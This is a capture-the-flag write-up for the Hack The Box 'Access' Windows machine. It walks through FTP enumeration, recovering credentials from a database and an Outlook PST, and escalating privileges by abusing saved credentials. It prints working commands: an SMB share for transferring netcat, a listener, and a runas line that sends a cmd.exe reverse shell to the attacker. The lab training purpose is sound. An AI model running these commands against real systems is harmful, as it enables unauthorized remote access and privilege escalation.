---
layout: post
title: Hack The Box, Access
tags: [Hack The Box, Windows, Impacket, Readpst]
---
![accesslogo](/boxes/htb/access/accessLogo.PNG)

### i. Port Scan
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
```
### ii. Enumeration
There are three services that are available to enumerate. To start off, we take a look at the http/website on port 80.  
![website](/boxes/access/website.PNG)  
After enumerating this service nothing was found. Next up is port 23 telnet. 

Connecting to telnet gives us a prompt for credentials. Trying a few common credentials didn't work. We will put this on the backburner for now.

Let's take a look at port 21 the FTP service. Nmap indicated anonymous FTP login was allowed and we were able to login and enumerate the FTP server.  
![ftpdirectories](/boxes/htb/access/ftpdir.PNG)  
A file backup.mdb was found in the Backups directory and we download a copy of it.  
![backupfile](/boxes/htb/access/backups.PNG)  
In the Engineer folder there is a file called Access Control.zip and we also transfer it to our machine.  
![accesscontrolfile](/boxes/htb/access/engineer.PNG)  
Trying to unzip the Access Control.zip file we run into password protection. We'll add this to the backburner list and look at the backup.mdb file. The backup.mdb file is a Microsoft Access Database. We transfer it to a Windows virtual machine and open it up.

Within the auth_user table credentials were found:

| username     | password          |
|--------------|-------------------|
| admin        | admin             |
| engineer     | access4u@security |
| backup_admin | admin             |

Trying the credentials via telnet did not work. Using the password `access4u@security` on the Access Control.zip file resulted in successfully extracting a file called Access Control.pst. Running the `file` command tells us this is a Microsoft Outlook PST.

Using the following command convert the pst to a mbox file and read its contents:
```
readpst Access\ Control.pst
cat Access\ Control.mbox
```
Within the mbox file we find an email with another set of credentials:  
![emailcreds](/boxes/htb/access/email.PNG)  
The credentials in the email gave us access to the machine via telnet and the user flag was found.  
![userflag](/boxes/htb/access/user.PNG)
### iii. Privilege Escalation
When performing Windows enumeration one of the things to check for is saved credentials. Running the following command lists any stored credentials:
```
cmdkey /list
```
![storedcreds](/boxes/htb/access/creds.PNG)  
Since stored credentials are available, there are a few options to obtain the root flag. The route we will take is sending ourselves an administrative shell. Within the Kali Linux distribution, you can find precompiled Windows binaries under the following directory:
 ```
 /usr/share/windows-binaries
 ```
 Using impacket's smbserver.py create an SMB share on the attack machine and transfer over a netcat binary.
 ```
 python smbserver.py sharename /share
 
 Copying files onto the victim machine:
 copy \\<ip address>\sharename\nc.exe .
 ```
Next set up a listener on the attack machine to prepare for the incoming shell:
```
nc -nlvp 443
```
Once the listener is setup, send a shell with the following command:
```
runas /user:access\administrator /savecred "cmd /c c:\users\security\nc.exe -nv <ip address> 443 -e c:\windows\system32\cmd.exe
```
The shell is received and is running as an administrative user! You can now capture the root flag!
![rootshell](/boxes/htb/access/rootshell.PNG)



